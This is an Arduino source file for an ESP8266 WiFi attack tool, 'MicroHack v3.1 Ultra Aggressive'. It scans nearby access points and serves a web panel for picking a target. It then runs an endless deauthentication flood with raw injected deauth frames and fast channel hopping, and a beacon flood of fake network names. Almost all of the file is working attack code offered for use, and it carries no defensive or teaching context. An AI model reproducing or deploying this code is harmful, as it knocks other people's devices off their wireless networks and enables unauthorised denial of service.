/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║   ESP8266 MicroHack v3.1  –  ULTRA AGGRESSIVE +++          ║
 * ║   - 1.5ms Channel Hopping (Custom Pattern)                ║
 * ║   - 30 Packets/Burst @ 5µs gap                           ║
 * ║   - 3 Beacons/Hop @ 50µs gap (Beacon Flood)              ║
 * ║   - Promiscuous ON during attacks (fixed injection)       ║
 * ║   - Web Interface (Scan → Select → Attack)                ║
 * ║   - Infinite Deauth Burst (Until STOP)                    ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include <user_interface.h>
}

// ─── Configuration ─────────────────────────────────────────────
#define CHANNEL_MAX           13
#define MAX_AP_CACHE          20
#define FAKE_SSID_COUNT       10
#define SCAN_HOP_INTERVAL_MS  150      // scanning speed
#define ATTACK_HOP_INTERVAL_US 1500    // 1.5ms per channel (ULTRA FAST)
#define BURST_COUNT           30       // packets per channel (Deauth)
#define BURST_DELAY_US        5        // µs gap (minimal)
#define BEACON_PER_HOP        3        // beacons per channel
#define BEACON_GAP_US         50       // gap between beacons
#define WDT_YIELD_INTERVAL_MS 30       // yield every 30ms

// ─── Global Variables ──────────────────────────────────────────
uint8_t currentChannel = 1;

struct ieee80211_hdr {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

// ─── Web Server ────────────────────────────────────────────────
ESP8266WebServer server(80);

// ─── State Machine ─────────────────────────────────────────────
enum Mode {
  MODE_IDLE = 0,
  MODE_SCAN = 1,
  MODE_TARGET = 2,
  MODE_DEAUTH = 3,
  MODE_BEACON = 4
};

Mode currentMode = MODE_SCAN;
uint8_t targetBssid[6] = {0};
bool targetSet = false;

// ─── AP Cache ──────────────────────────────────────────────────
struct ApRecord {
  uint8_t bssid[6];
  char    ssid[33];
  uint8_t ssid_len;
  uint8_t channel;
  int8_t  rssi;
  uint32_t last_seen;
};
ApRecord apCache[MAX_AP_CACHE];
uint8_t apCount = 0;

// ─── Channel Pattern (balanced, ch6 dominant but more spread) ─
static const uint8_t channelPattern[] = {
  6,  4,  1,  9,  11, 6,  2,  13, 6,  5,
  11, 7,  1,  8,  6,  10, 11, 12, 1,  3,
  6,  4,  9,  2,  13, 5,  7,  8,  10, 12,
  6,  1,  11, 6,  13
};
#define PATTERN_LEN (sizeof(channelPattern) / sizeof(channelPattern[0]))
uint8_t patternIndex = 0;

// ─── Attack Timers ─────────────────────────────────────────────
uint32_t lastHopUs = 0;
uint32_t lastYieldMs = 0;
uint32_t deauthSent = 0;

// ─── Beacon Spam ──────────────────────────────────────────────
const char* const fakeSSIDs[] = {
  "FBI_Surveillance", "NSA_Node_7", "Not_Your_WiFi",
  "Skynet_Unit",      "CIA_Ops",    "VaultTec",
  "HackTheGibson",    "DefinitelyNotAP", "ThePromisedLAN",
  "GetOwnWiFi"
};
uint8_t beaconIdx = 0;
uint8_t fakeMacs[FAKE_SSID_COUNT][6] = {0};

// ─── Helpers ──────────────────────────────────────────────────
void randomMac(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

void macToStr(uint8_t *mac, char *buf) {
  snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ─── Frame Injection ──────────────────────────────────────────
void sendDeauth(uint8_t *bssid, uint8_t *sta = nullptr) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t *dst = sta ? sta : broadcast;

  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x07, 0x00
  };
  static uint8_t reasonIdx = 0;
  const uint8_t reasons[] = {1,2,4,7,8,15};
  frame[24] = reasons[reasonIdx % 6];
  reasonIdx++;

  wifi_send_pkt_freedom(frame, sizeof(frame), 0);
}

void sendBeacon(uint8_t *bssid, const char *ssid, uint8_t channel) {
  uint8_t frame[128];
  int p = 0;
  frame[p++] = 0x80; frame[p++] = 0x00;
  frame[p++] = 0x00; frame[p++] = 0x00;
  for (int i=0; i<6; i++) frame[p++] = 0xFF;
  memcpy(frame + p, bssid, 6); p += 6;
  memcpy(frame + p, bssid, 6); p += 6;
  frame[p++] = 0x00; frame[p++] = 0x00;
  memset(frame + p, 0, 8); p += 8;
  frame[p++] = 0x64; frame[p++] = 0x00;
  frame[p++] = 0x11; frame[p++] = 0x04;
  uint8_t ssid_len = strlen(ssid);
  frame[p++] = 0x00; frame[p++] = ssid_len;
  memcpy(frame + p, ssid, ssid_len); p += ssid_len;
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
  frame[p++] = 0x24; frame[p++] = 0x30; frame[p++] = 0x48; frame[p++] = 0x6C;
  frame[p++] = 0x03; frame[p++] = 0x01;
  frame[p++] = channel;
  wifi_send_pkt_freedom(frame, p, 0);
}

// ─── Promiscuous Callback ─────────────────────────────────────
static void promiscuousCb(uint8_t *buf, uint16_t len) {
  if (currentMode != MODE_SCAN) return;   // अटैक के दौरान निष्क्रिय
  if (len < sizeof(ieee80211_hdr)) return;

  ieee80211_hdr *hdr = (ieee80211_hdr *)buf;
  uint16_t fc = hdr->frame_ctrl;
  uint8_t type = (fc >> 2) & 0x03;
  uint8_t subtype = (fc >> 4) & 0x0F;

  if (type != 0 || subtype != 8) return; // only beacons

  const uint8_t *bssid = hdr->addr3;
  int8_t rssi = (int8_t)wifi_promiscuous_get_rssi();
  uint8_t ch = currentChannel;

  uint8_t *payload = (uint8_t *)(hdr + 1);
  uint16_t payload_len = len - sizeof(ieee80211_hdr);
  if (payload_len < 12) return;

  uint8_t *ie = payload + 12;
  uint16_t ie_len = payload_len - 12;

  char ssid[33] = {0};
  uint8_t ssid_len = 0;
  uint8_t beacon_ch = ch;

  uint16_t pos = 0;
  while (pos + 2 <= ie_len) {
    uint8_t tag = ie[pos];
    uint8_t tlen = ie[pos + 1];
    if (pos + 2 + tlen > ie_len) break;
    if (tag == 0 && tlen > 0 && tlen <= 32) {
      memcpy(ssid, ie + pos + 2, tlen);
      ssid_len = tlen;
      ssid[tlen] = '\0';
    } else if (tag == 3 && tlen == 1) {
      beacon_ch = ie[pos + 2];
    }
    pos += 2 + tlen;
  }

  if (ssid_len == 0 || rssi < -100) return;

  bool found = false;
  for (int i = 0; i < apCount; i++) {
    if (memcmp(apCache[i].bssid, bssid, 6) == 0) {
      memcpy(apCache[i].ssid, ssid, ssid_len + 1);
      apCache[i].ssid_len = ssid_len;
      apCache[i].channel = beacon_ch;
      apCache[i].rssi = rssi;
      apCache[i].last_seen = millis();
      found = true;
      break;
    }
  }
  if (!found && apCount < MAX_AP_CACHE) {
    memcpy(apCache[apCount].bssid, bssid, 6);
    memcpy(apCache[apCount].ssid, ssid, ssid_len + 1);
    apCache[apCount].ssid_len = ssid_len;
    apCache[apCount].channel = beacon_ch;
    apCache[apCount].rssi = rssi;
    apCache[apCount].last_seen = millis();
    apCount++;
  }
}

// ─── Web Handlers ──────────────────────────────────────────────
void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>🔥 MicroHack Ultra+++</title>
  <style>
    body { background: #0a0a0a; color: #ff3333; font-family: monospace; padding: 20px; }
    .btn { background: #1a0a0a; border: 1px solid #ff3333; color: #ff3333; padding: 8px 16px; margin: 4px; cursor: pointer; }
    .btn:hover { background: #ff333322; }
    .ap-item { padding: 4px; border-bottom: 1px solid #ff333344; }
  </style>
</head>
<body>
  <h1>⚡ ULTRA AGGRESSIVE v3.1</h1>
  <div>
    <button class="btn" onclick="fetch('/scan')">🔄 Scan</button>
    <button class="btn" onclick="fetch('/attack/deauth')">💀 Infinite Deauth</button>
    <button class="btn" onclick="fetch('/attack/beacon')">📡 Beacon Flood</button>
    <button class="btn" onclick="fetch('/stop')">⏹ KILL ALL</button>
  </div>
  <div id="ap-list">
    <h3>Targets:</h3>
    <div id="aps"></div>
  </div>
  <div id="output" style="border-top:1px solid #ff333344; margin-top:20px; padding-top:10px; white-space:pre-wrap;"></div>
  <script>
    function fetchCmd(url) {
      fetch(url).then(r => r.text()).then(t => {
        document.getElementById('output').textContent += t + '\n';
        if (url === '/scan') updateAPs();
      });
    }
    function updateAPs() {
      fetch('/aps').then(r => r.json()).then(data => {
        let html = '';
        data.forEach((ap, i) => {
          html += `<div class="ap-item">
            <b>${i}</b> ${ap.ssid} | Ch:${ap.channel} | RSSI:${ap.rssi}
            <button class="btn" onclick="fetch('/select?idx=${i}')">🎯 SELECT</button>
          </div>`;
        });
        document.getElementById('aps').innerHTML = html;
      });
    }
    updateAPs();
  </script>
</body>
</html>
)rawliteral";
  server.send(200, "text/html", html);
}

void handleScan() {
  apCount = 0;
  currentMode = MODE_SCAN;
  wifi_promiscuous_enable(1);
  currentChannel = 1;
  wifi_set_channel(1);
  server.send(200, "text/plain", "SCANNING...\n");
}

void handleAPs() {
  String json = "[";
  for (int i = 0; i < apCount; i++) {
    if (i) json += ",";
    json += "{";
    json += "\"ssid\":\"" + String(apCache[i].ssid) + "\",";
    json += "\"channel\":" + String(apCache[i].channel) + ",";
    json += "\"rssi\":" + String(apCache[i].rssi);
    json += "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleSelect() {
  if (server.hasArg("idx")) {
    int idx = server.arg("idx").toInt();
    if (idx >= 0 && idx < apCount) {
      memcpy(targetBssid, apCache[idx].bssid, 6);
      targetSet = true;
      currentMode = MODE_TARGET;
      server.send(200, "text/plain", "🎯 TARGET LOCKED: " + String(apCache[idx].ssid) + "\n");
      return;
    }
  }
  server.send(400, "text/plain", "INVALID INDEX\n");
}

void handleAttackDeauth() {
  if (!targetSet) {
    server.send(400, "text/plain", "❌ Select target first.\n");
    return;
  }
  currentMode = MODE_DEAUTH;
  deauthSent = 0;
  lastHopUs = micros();
  lastYieldMs = millis();
  patternIndex = 0;
  wifi_promiscuous_enable(1);
  server.send(200, "text/plain", "💀 INFINITE DEAUTH ENGAGED (1.5ms hop, 30 burst)\n");
}

void handleAttackBeacon() {
  currentMode = MODE_BEACON;
  beaconIdx = 0;
  lastHopUs = micros();
  lastYieldMs = millis();
  patternIndex = 0;
  wifi_promiscuous_enable(1);
  server.send(200, "text/plain", "📡 BEACON FLOOD STARTED (1.5ms hop, 3 beacons/hop)\n");
}

void handleStop() {
  currentMode = MODE_IDLE;
  targetSet = false;
  wifi_promiscuous_enable(0);
  server.send(200, "text/plain", "⏹ ALL OPERATIONS TERMINATED\n");
}

void handleStatus() {
  String s = "MODE: ";
  switch(currentMode) {
    case MODE_IDLE: s += "IDLE"; break;
    case MODE_SCAN: s += "SCAN"; break;
    case MODE_TARGET: s += "TARGET"; break;
    case MODE_DEAUTH: s += "DEAUTH (SENT:" + String(deauthSent) + ")"; break;
    case MODE_BEACON: s += "BEACON"; break;
  }
  s += "\nAPs: " + String(apCount);
  s += "\nTARGET: " + String(targetSet ? "SET" : "NONE");
  server.send(200, "text/plain", s);
}

// ─── Setup ──────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  WiFi.softAP("MicroHack", NULL, 1, 0, 4);

  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuousCb);
  wifi_set_channel(1);

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/aps", handleAPs);
  server.on("/select", handleSelect);
  server.on("/attack/deauth", handleAttackDeauth);
  server.on("/attack/beacon", handleAttackBeacon);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);
  server.begin();

  Serial.println("\n╔═══════════════════════════════════════════════════╗");
  Serial.println("║   🔥 ULTRA AGGRESSIVE v3.1 ACTIVE               ║");
  Serial.println("║   Connect to WiFi: MicroHack                     ║");
  Serial.println("║   IP: 192.168.4.1                               ║");
  Serial.println("║   Channel hop: 1.5ms | Burst: 30 packets        ║");
  Serial.println("╚═══════════════════════════════════════════════════╝\n");
}

// ─── Main Loop ──────────────────────────────────────────────────
void loop() {
  uint32_t nowUs = micros();
  uint32_t nowMs = millis();

  server.handleClient();

  if (nowMs - lastYieldMs > WDT_YIELD_INTERVAL_MS) {
    yield();
    lastYieldMs = nowMs;
  }

  switch (currentMode) {
    case MODE_SCAN: {
      static uint32_t lastScanHop = 0;
      if (nowMs - lastScanHop > SCAN_HOP_INTERVAL_MS) {
        currentChannel = (currentChannel % CHANNEL_MAX) + 1;
        wifi_set_channel(currentChannel);
        wifi_promiscuous_enable(1);
        lastScanHop = nowMs;
      }
      break;
    }

    case MODE_TARGET:
      break;

    case MODE_DEAUTH: {
      if (nowUs - lastHopUs >= ATTACK_HOP_INTERVAL_US) {
        uint8_t ch = channelPattern[patternIndex % PATTERN_LEN];
        patternIndex++;
        currentChannel = ch;
        wifi_set_channel(ch);
        lastHopUs = nowUs;

        for (int i = 0; i < BURST_COUNT; i++) {
          sendDeauth(targetBssid);
          deauthSent++;
          delayMicroseconds(BURST_DELAY_US);
        }
        if (deauthSent % 1000 == 0) {
          Serial.printf("[Deauth] Total: %u packets sent\n", deauthSent);
        }
      }
      break;
    }

    case MODE_BEACON: {
      if (nowUs - lastHopUs >= ATTACK_HOP_INTERVAL_US) {
        uint8_t ch = channelPattern[patternIndex % PATTERN_LEN];
        patternIndex++;
        currentChannel = ch;
        wifi_set_channel(ch);
        lastHopUs = nowUs;

        for (int b = 0; b < BEACON_PER_HOP; b++) {
          if (fakeMacs[beaconIdx][0] == 0) randomMac(fakeMacs[beaconIdx]);
          sendBeacon(fakeMacs[beaconIdx], fakeSSIDs[beaconIdx], currentChannel);
          beaconIdx = (beaconIdx + 1) % FAKE_SSID_COUNT;
          delayMicroseconds(BEACON_GAP_US);
        }
      }
      break;
    }

    case MODE_IDLE:
    default:
      break;
  }
}
